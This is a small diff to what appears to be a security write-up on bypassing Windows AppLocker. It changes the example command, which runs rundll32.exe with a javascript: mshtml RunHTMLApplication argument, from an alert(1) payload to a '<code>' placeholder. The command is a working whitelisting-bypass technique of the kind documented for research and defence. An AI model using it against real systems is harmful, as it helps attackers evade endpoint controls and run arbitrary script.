@@ -11,7 +11,7 @@ The vulnerability occurs since it is not possible to block the EXE file 'rundll3
 Everything that you need to do to bypass applocker is run the rundll32.exe binary file with the following arguments (can be done by creating a shortcut, windows+R, etc):
 
 ```
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert(1);
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";<code>
 ```
 
 
